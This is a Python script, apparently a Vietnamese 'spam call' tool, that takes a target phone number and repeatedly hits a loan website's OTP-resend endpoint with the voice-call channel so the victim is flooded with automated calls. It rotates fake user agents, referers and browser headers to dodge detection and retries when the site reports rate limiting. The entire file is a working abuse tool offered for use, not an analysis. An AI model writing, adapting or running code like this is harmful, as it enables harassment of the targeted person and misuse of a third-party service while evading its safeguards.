import subprocess
import sys
import os

def install_packages():
    packages = ['requests', 'fake-useragent']
    for package in packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            print(f"\033[93m[+] Đang cài đặt {package}...\033[0m")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet'])
            print(f"\033[92m[+] Đã cài đặt {package}\033[0m")

install_packages()

import requests
import time
import random
import os
import sys
from fake_useragent import UserAgent

os.system('clear' if os.name == 'posix' else 'cls')

print("\033[94m╔════════════════════════════════════════════════════════════╗\033[0m")
print("\033[94m║           TOOL SPAM CALL FULL VERSION                      ║\033[0m")
print("\033[94m╚════════════════════════════════════════════════════════════╝\033[0m")

if len(sys.argv) >= 2:
    phone = sys.argv[1]
    count = int(sys.argv[2]) if len(sys.argv) >= 3 else 10
    print(f"\033[93m[+] Số điện thoại từ lệnh: {phone}\033[0m")
    print(f"\033[93m[+] Số lần từ lệnh: {count}\033[0m")
else:
    phone = input("\033[93mNhập số điện thoại cần spam (VD: 0338801915): \033[0m")
    count = int(input("\033[93mNhập số lần gọi (VD: 10): \033[0m"))

print(f"\n\033[92m[+] Bắt đầu spam {count} cuộc gọi tới {phone}\033[0m")
print("\033[90m" + "="*60 + "\033[0m\n")

ua = UserAgent()

referers = [
    'https://vayxanh.com/',
    'https://vayxanh.com/vay-tien-nhanh/',
    'https://vayxanh.com/dang-ky-vay/',
    'https://google.com/',
    'https://facebook.com/',
    'https://zalo.me/',
    'https://youtube.com/',
    'https://tiktok.com/',
]

for i in range(1, count + 1):
    try:
        random_ua = ua.random
        random_referer = random.choice(referers)
        
        headers = {
            'accept': '*/*',
            'accept-language': 'vi-VN,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://lk.vayxanh.com',
            'referer': random_referer,
            'user-agent': random_ua,
            'sec-ch-ua': f'"{random.choice(["Chromium", "Google Chrome", "Microsoft Edge"])}";v="{random.randint(120, 130)}"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': f'"{random.choice(["Android", "iOS", "Windows", "macOS"])}"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }
        
        payload = {
            "data": {
                "phone": phone,
                "code": "resend",
                "channel": "ivr"
            }
        }
        
        session = requests.Session()
        
        session.get(
            f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7&utm_source=direct_vayxanh&utm_medium=organic&utm_campaign=direct_vayxanh&utm_content=mainpage_submit',
            headers={
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'vi-VN,en-US;q=0.9,en;q=0.8',
                'referer': random_referer,
                'upgrade-insecure-requests': '1',
                'user-agent': random_ua,
                'sec-ch-ua': f'"{random.choice(["Chromium", "Google Chrome", "Microsoft Edge"])}";v="{random.randint(120, 130)}"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': f'"{random.choice(["Android", "iOS", "Windows", "macOS"])}"'
            },
            timeout=10
        )
        
        time.sleep(random.uniform(0.1, 0.5))
        
        response = session.post(
            'https://lk.vayxanh.com/internal/client/otp/send',
            headers=headers,
            json=payload,
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"\033[92m[{i}/{count}] ✓ Gửi yêu cầu gọi thành công\033[0m")
            print(f"\033[90m    → UA: {random_ua[:40]}...\033[0m")
        elif response.status_code == 400:
            try:
                err = response.json()
                if 'limit' in str(err).lower() or 'too many' in str(err).lower():
                    print(f"\033[93m[{i}/{count}] ⚠ Bị giới hạn, đang đợi...\033[0m")
                    time.sleep(random.uniform(1, 2))
                    continue
                else:
                    print(f"\033[91m[{i}/{count}] ✗ Lỗi: HTTP {response.status_code}\033[0m")
                    print(f"    → {response.text[:150]}")
            except:
                print(f"\033[91m[{i}/{count}] ✗ Lỗi: HTTP {response.status_code}\033[0m")
                print(f"    → {response.text[:150]}")
        else:
            print(f"\033[91m[{i}/{count}] ✗ Lỗi: HTTP {response.status_code}\033[0m")
            if response.text:
                print(f"    → {response.text[:150]}")
        
        if i < count:
            delay = random.uniform(0, 1)
            print(f"\033[90m    → Đợi {delay:.1f}s\033[0m")
            time.sleep(delay)
            
    except requests.exceptions.Timeout:
        print(f"\033[91m[{i}/{count}] ✗ Timeout - Đang thử lại...\033[0m")
        time.sleep(random.uniform(0, 1))
    except requests.exceptions.ConnectionError:
        print(f"\033[91m[{i}/{count}] ✗ Lỗi kết nối - Đang thử lại...\033[0m")
        time.sleep(random.uniform(0, 1))
    except Exception as e:
        print(f"\033[91m[{i}/{count}] ✗ Lỗi: {str(e)}\033[0m")
        time.sleep(random.uniform(0, 1))

print(f"\n\033[92m" + "="*60)
print(f"✅ Đã hoàn thành {count} cuộc gọi tới {phone}")
print("="*60 + "\033[0m")